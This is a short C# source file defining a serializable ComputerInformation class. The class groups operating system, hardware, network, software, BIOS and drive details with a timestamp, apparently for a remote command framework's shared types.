using System;
using System.Collections.Generic;

namespace Orcus.Shared.Commands.ComputerInformation
{
    [Serializable]
    public class ComputerInformation
    {
        public OperatingSystemInformation SystemInformation { get; set; }
        public HardwareInformation HardwareInformation { get; set; }
        public NetworkInformation NetworkInformation { get; set; }
        public SoftwareInformation SoftwareInformation { get; set; }
        public BiosInformation BiosInformation { get; set; }
        public List<LogicalDrive> LogicalDrives { get; set; }

        public int ProcessTime { get; set; }
        public DateTime Timestamp { get; set; }
    }
}